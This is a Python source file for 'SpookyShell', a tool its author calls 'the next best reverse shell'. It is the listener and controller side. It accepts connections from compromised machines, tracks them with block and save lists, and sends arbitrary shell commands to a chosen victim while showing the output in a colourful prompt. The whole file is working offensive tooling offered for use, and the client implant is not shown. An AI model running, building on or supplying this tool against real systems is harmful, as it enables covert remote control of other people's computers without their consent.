#
#
#   _____                   _           _____ _          _ _
#  / ____|                 | |         / ____| |        | | |
# | (___  _ __   ___   ___ | | ___   _| (___ | |__   ___| | |
#  \___ \| '_ \ / _ \ / _ \| |/ / | | |\___ \| '_ \ / _ \ | |
#  ____) | |_) | (_) | (_) |   <| |_| |____) | | | |  __/ | |
# |_____/| .__/ \___/ \___/|_|\_\\__, |_____/|_| |_|\___|_|_|
#        | |                      __/ |
#        |_|                     |___/
#
#
# The next best reverse shell.
#
# Hey, thanks for using SpookyShell!
# Have a look at the source code freely but any distrubution othernthan MY Git repo
# is not permitted.
#
# Bye!


# ==// IMPORTS \\==#
import argparse
import socket
import sys
import threading
import os
import re
import importlib

from rich.table import Table
from rich import box
from pyfiglet import print_figlet
from queue import Queue
from pynput.keyboard import Key, Controller
from login import login_screen
from util import clear_screen, print_but_cooler, yes_no_prompt, console, read_data, InteractiveExit
from subprocess import check_output
from msvcrt import getch


# ==// VARIABLES \\==#
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_addresses = []
connected = False
verbose = False


# ==// FUNCTIONS \\==#
def accept_connections(s: socket.socket):
    """Manage situations where a new connection is added.
    """
    if verbose:
        print_but_cooler(console, "Info", "Accepting connections..", "bold cyan")
    while True:
        try:
            blocked = get_blocked_ips("data.dat")
            conn, address = s.accept()
            if verbose:
                print_but_cooler(console, "Info", "Accepted connection.", "bold cyan")

            if address[0] in blocked:
                if verbose:
                    print_but_cooler(console, "Info", "Blocked new connection.", "bold cyan")
                print_but_cooler(console, "Info", f"A new connection has been blocked! Address: {address[0]}", "bold cyan")
                continue
            
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            if verbose:
                print_but_cooler(console, "Info", "Registered new connection.", "bold cyan")
            print()

            if connected == False:
                print_but_cooler(console, "Info", f"A new connection has been added! Address: {address[0]}", "bold cyan")

            k = Controller()
            k.press(Key.enter)
        except socket.error as msg:
            if verbose:
                print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
            print_but_cooler(console, "Error", f"Error accepting connection, {msg}", "bold red")

def get_blocked_ips(file: str):
    if verbose:
        print_but_cooler(console, "Info", "Getting blocked ips..", "bold cyan")
    blocked = []

    try:
        data = read_data(file)
        blocked = data[0]
    except IndexError:
        pass

    return blocked

def get_saved_ips(file: str):
    if verbose:
        print_but_cooler(console, "Info", "Getting saved ips..", "bold cyan")
    saved = []

    try:
        data = read_data(file)
        saved = data[1]
    except IndexError:
        pass

    return saved

def get_target(args: list, all_connections: list):
    """Get a target based on their id in the `all_connections` list.

    Args:
        args (list): The arguments passed by the interactive shell parser.
    """
    global connected
    try:
        if verbose:
            print_but_cooler(console, "Info", "Getting target..", "bold cyan")
        target = args[0]
        target = int(target)

        conn = all_connections[target]
        connected = True
        return conn
    except Exception:
        if verbose:
            print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
        print_but_cooler(console, "Error", "Invalid connection!", "bold red")
        return None

def get_address(args: list):
    """Get an address based on their id in the `all_addresses` list.

    Args:
        args (list): The arguments passed by the interactive shell parser.
    """
    try:
        if verbose:
            print_but_cooler(console, "Info", "Getting adress from client..", "bold cyan")
        target = args[0]

        addr = all_addresses[all_addresses.index(target)]
        return addr
    except:
        if verbose:
            print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
        print_but_cooler(console, "Error", "Invalid address!", "bold red")
        return None

def send_commands(conn: socket.socket, name, host_addr):
    """Send commands to the specified connection for client, server communication.
    """
    while True:
        if verbose:
            print_but_cooler(console, "Info", "Showing command prompt..", "bold cyan")
        cmd = console.input(f"[deep_pink3](remote)[/deep_pink3] [light_goldenrod2]{host_addr[0]}[/light_goldenrod2][bold white]:[/bold white][pale_green3]{name}[/pale_green3][bold]$[/bold] ")
        cmd = cmd.lower()

        if cmd == "quit":
            if verbose:
                print_but_cooler(console, "Info", "Broke from session.", "bold cyan")
            break

        if len(str.encode(cmd)) > 0:
            if verbose:
                print_but_cooler(console, "Info", "Sending command..", "bold cyan")
            conn.send(str.encode(cmd))
            if verbose:
                print_but_cooler(console, "Info", "Waiting for client response..", "bold cyan")
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response)

def interactive_shell():
    """The main interactive shell loop
    """
    while True:
        try:
            if verbose:
                print_but_cooler(console, "Info", "Shwoing prompt..", "bold cyan")
            cmd = console.input("[light_goldenrod2](local)[/light_goldenrod2] [cornflower_blue]spooky[/cornflower_blue][bold]$[/bold] ")
            split_string = cmd.split(" ")
            cmd = split_string[0]
            args = split_string[1:]

            if len(cmd) < 1:
                continue

            commands_folder = os.path.join(os.getcwd(), "commands")

            if verbose:
                print_but_cooler(console, "Info", "Checking for commands folder..", "bold cyan")
            if not os.path.exists(commands_folder):
                if verbose:
                    print_but_cooler(console, "Info", "Displaying yes-no prompt..", "bold cyan")
                prompt = yes_no_prompt(console, "Your [bold]commands[/bold] folder doesn't exist! Create it? ")

                if prompt == True:
                    if verbose:
                        print_but_cooler(console, "Info", "Creating commands folder..", "bold cyan")
                    os.mkdir(commands_folder)
                else:
                    continue
            
            if len(cmd) < 1:
                continue

            found = False
            for file in os.listdir(commands_folder):
                if file.endswith(".py"):
                    file_name = file[:len(file) - 3]
                    
                    if file_name == cmd:
                        if verbose:
                            print_but_cooler(console, "Info", "Found command file.", "bold cyan")
                        found = True

                        commands = importlib.import_module("commands." + file_name)
                        command_class = commands.Command()

                        min_args = command_class.MIN_ARGS
                        max_args = command_class.MAX_ARGS

                        if verbose:
                            print_but_cooler(console, "Info", "Got command info.", "bold cyan")

                        for k, v in {**command_class.ARGUMENTS}.items():
                            if v.required == False:
                                if v.default != None:
                                    if len(args) < 1:
                                        if verbose:
                                            print_but_cooler(console, "Info", "Added default arguments.", "bold cyan")
                                        args.append(v.default)

                        if len(args) < min_args:
                            if verbose:
                                print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
                            print_but_cooler(console, "Error", f"{file_name} takes at least {command_class.MIN_ARGS} arguments.", "bold red")
                            continue
                        elif len(args) > max_args:
                            if verbose:
                                print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
                            print_but_cooler(console, "Error", f"{file_name} takes at most {command_class.MAX_ARGS} arguments.", "bold red")
                            continue
                        
                        if verbose:
                            print_but_cooler(console, "Info", "Running command..", "bold cyan")
                        command_class.run(args, console, all_connections, all_addresses)

                        break                
            if found == False:
                if verbose:
                    print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
                print_but_cooler(console, "Error", "The specified command doesn't exist!", "bold red")
            print()
        except (EOFError, InteractiveExit) as msg:
            if type(msg) == EOFError:
                print("")
                
            if len(all_connections) > 0:
                if verbose:
                     print_but_cooler(console, "Info", "Displaying yes-no prompt..", "bold cyan")
                prompt = yes_no_prompt(console, "Are you sure? All connections will be disconnected! ")

                if prompt == False:
                    print()
                    continue
            
            if verbose:
                print_but_cooler(console, "Info", "Displaying goodbye message..", "bold cyan")
            print_but_cooler(console, "Shell", "Thanks for using SpookyShell. Goodbye!", "bold green")
            if verbose:
                print_but_cooler(console, "Info", "Emptying queue..", "bold cyan")
            queue.task_done()
            if verbose:
                print_but_cooler(console, "Info", "Exitting..", "bold cyan")
            return

def list_connections(all_connections: list, all_addresses: list):
    """Print out all available connections.
    """
    results = []

    blocked = get_blocked_ips("../data.dat")
    saved = get_saved_ips("../data.dat")

    for i, addr in enumerate(saved):
        if len(all_addresses) < 1:
            results.append(("N/A", addr, "N/A", "[[bold red]DISCONNECTED[/bold red]]"))
        else:
            for z, addr2 in enumerate(all_addresses):
                if addr == addr2[0]:
                    results.append((str(z), str(all_addresses[z][0]), str(all_addresses[z][1]), "[[bold green]CONNECTED[/bold green]]"))

    for i, addr in enumerate(all_addresses):
        if addr[0] in blocked:
            del all_connections[i]
            del all_addresses[i]
            continue

    for i, conn in enumerate(all_connections):
        try:
            ip = socket.gethostbyname(conn.getpeername()[0])

            if ip in saved:
                conn.send(str.encode(" "))
                #Sconn.recv(20480)
        except socket.error:
            if not all_addresses[i][0] in saved:
                del all_connections[i]
                del all_addresses[i]
                continue
        except AttributeError:
            continue

        if all_addresses[i][0] not in saved:
            results.append((str(i), str(all_addresses[i][0]), str(all_addresses[i][1])))
        #results += f"{str(i)} : : : {str(all_addresses[i][0])} : : : {str(all_addresses[i][1])}\n"

    if len(results) > 0:
        #print("----------- Clients -----------")
        #console.print("[bold]id[/bold]      [bold]ip[/bold]                [bold]port[/bold]")
        #print(results, end="")
        clients = Table(title="Available Clients", box=box.MINIMAL_DOUBLE_HEAD)
        clients.add_column("ID")
        clients.add_column("Address")
        clients.add_column("Port")

        for result in results:
            if len(result) == 3:
                clients.add_row(f"[underline]{result[0]}[/underline]", f"[underline]{result[1]}[/underline]", f"[underline]{result[2]}[/underline]")
            elif len(result) == 4: # The result is a saved ip
                clients.add_row(f"[underline]{result[0]}[/underline]", f"[underline]{result[1]}[/underline]", f"[underline]{result[2]}[/underline]", f"[underline]{result[3]}[/underline]")

        console.print(clients)
    else:
        print("There are no current connections.")

def work():
    """Does the next job in the queue (one handles connetions, one sends commands)
    """
    global args
    while True:
        x = queue.get()
        if x == 1:
            # Create the socket for networking
            try:
                if verbose:
                    print_but_cooler(console, "Info", "Creating socket..", "bold cyan")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except socket.error as msg:
                if verbose:
                    print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
                print_but_cooler(console, "Error", f"Failed to create a socket, [white]{msg}[/white]", "bold red")
                sys.exit(1)

            # Bind the socket to the host ip, also listen for stuff idk
            try: 
                if verbose:
                    print_but_cooler(console, "Info", "Binding socket..", "bold cyan")
                s.bind((args.ip, args.port))
                if verbose:
                    print_but_cooler(console, "Info", "Socket listening..", "bold cyan")
                s.listen(5)
            except socket.error as msg:
                if verbose:
                    print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
                print_but_cooler(console, "Error", f"Failed to establish a connection, [white]{msg}[/white]", "bold red")
                if verbose:
                    print_but_cooler(console, "Info", "Emptying queue..", "bold cyan")
                queue.task_done()
                if verbose:
                    print_but_cooler(console, "Info", "Exitting..", "bold cyan")
                sys.exit(1)

            if verbose:
                print_but_cooler(console, "Info", "Accepting connections..", "bold cyan")
            accept_connections(s)
        if x == 2:
            if verbose:
                print_but_cooler(console, "Info", "Starting interactive shell..", "bold cyan")
            interactive_shell()
        if verbose:
            print_but_cooler(console, "Info", "Emptying queue..", "bold cyan")
        queue.task_done()

def update():
    updated = False
    cwd = os.path.dirname(os.path.abspath(__file__))

    try:
        print_but_cooler(console, "Info", "Pulling changes from master branch[white]...[/white]", "bold cyan")

        if verbose:
            print_but_cooler(console, "Info", f"Running \"cd {cwd}&&git pull https://github.com/SpookyDervish/SpookyShell main\"..", "bold cyan")
        u = check_output(f'cd {cwd}&&git pull https://github.com/SpookyDervish/SpookyShell main', shell=True).decode('utf-8')

        if re.search("Updating", u):
            if verbose:
                print_but_cooler(console, "Info", "Update succeeded, displaying restart message..", "bold cyan")
            print_but_cooler(console, "Info", "Successfully updated! Please restart SpookyShell.", "bold cyan")
            updated = True
        elif re.search('Already up to date', u):
            if verbose:
                print_but_cooler(console, "Info", "Displaying up-to-date message..", "bold cyan")
            print_but_cooler(console, "Info", "Already running latest version of SpookyShell!", "bold cyan")
            getch()
        else:
            if verbose:
                print_but_cooler(console, "Info", "Displaying error message..", "bold cyan")
            print_but_cooler(console, "Error", "Something went wrong. Are you running SpookyShell from your local git repository?", "bold red")
            print_but_cooler(console, "Info", 'Consider running "git pull https://github.com/SpookyDervish/SpookyShell main" inside the project\'s directory.', "bold cyan")
            getch()
    except:
        if verbose:
            print_but_cooler(console, "Info", "Displaying error messsage..", "bold cyan")
        print_but_cooler(console, "Error", 'Update failed. Consider running "git pull https://github.com/SpookyDervish/SpookyShell main" inside the project\'s directory.', "bold red")
        getch()

    if updated:
        if verbose:
            print_but_cooler(console, "Info", "Quitting..", "bold cyan")
        sys.exit(0)


# ==// MAIN \\==#
if __name__ == "__main__":
    # Command line argument parsing done by argparse, very nice
    parser = argparse.ArgumentParser(description="A reverse shell written in Python.", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-i", "--ip", help="The IP of the host of the attack.", type=str, default=socket.gethostbyname(socket.gethostname()))
    parser.add_argument("-p", "--port", help="The port number the attack will be hosted on.", type=int, default=9999)
    parser.add_argument("-q", "--quiet", help="Don't print banner on startup.", action="store_true")
    parser.add_argument("-u", "--update", help="Pull the latest version from the Github repo.", action="store_true")
    parser.add_argument("-v", "--version", help="Display version and exit.", action="store_true")
    parser.add_argument("-V", "--verbose", help="Display a lot more information while doing operations.", action="store_true")

    args = parser.parse_args()

    version = "1.0.0"
    verbose = args.verbose

    if args.quiet == False: # Display logo and credit
        if verbose:
            print_but_cooler(console, "Info", "Displaying logo..", "bold cyan")
        print_figlet("SpookyShell", "Doom", "LIGHT_GREEN")
        if verbose:
            print_but_cooler(console, "Info", "Displaying credit..", "bold cyan")
        console.print((" " * 40) + "By: SpookyDervish", style="bold")
        print("")
        print("")

    if args.update:
        update()

    if args.version:
        if verbose:
            print_but_cooler(console, "Info", "Displaying version..", "bold cyan")
        console.print(f"[pale_turquoise1]SpookyShell[/pale_turquoise1] Version {version}.", highlight=False)
        console.print("[dim]The next best reverse shell.[/dim]")
        sys.exit(0)

    if verbose:
            print_but_cooler(console, "Info", "Displaying login screen..", "bold cyan")
    login_success = login_screen(args.quiet)

    if login_success == True:
        if verbose:
            print_but_cooler(console, "Info", "Login succeeded", "bold cyan")
        if args.quiet:
            if verbose:
                print_but_cooler(console, "Info", "Clearing screen..", "bold cyan")
            clear_screen()

        if verbose:
            print_but_cooler(console, "Info", "Displaying help message..", "bold cyan")
        print_but_cooler(console, "Info", "Type \"help\" to get a list of available prompt commands.\n", "bold cyan")

        # Set up the the threads for managing multiple clients at once, lovely 100% CPU usage :)
        if verbose:
            print_but_cooler(console, "Info", "Starting threads..", "bold cyan")
        for _ in range(NUMBER_OF_THREADS):
            # Create a new thread
            t = threading.Thread(target=work)
            t.daemon = True # Don't run in the background asshole
            t.start()

        # Create jobs, each list item is a new job
        if verbose:
            print_but_cooler(console, "Info", "Creating jobs..", "bold cyan")
        for x in JOB_NUMBER:
            queue.put(x)
        try:
            queue.join()
        except KeyboardInterrupt:
            pass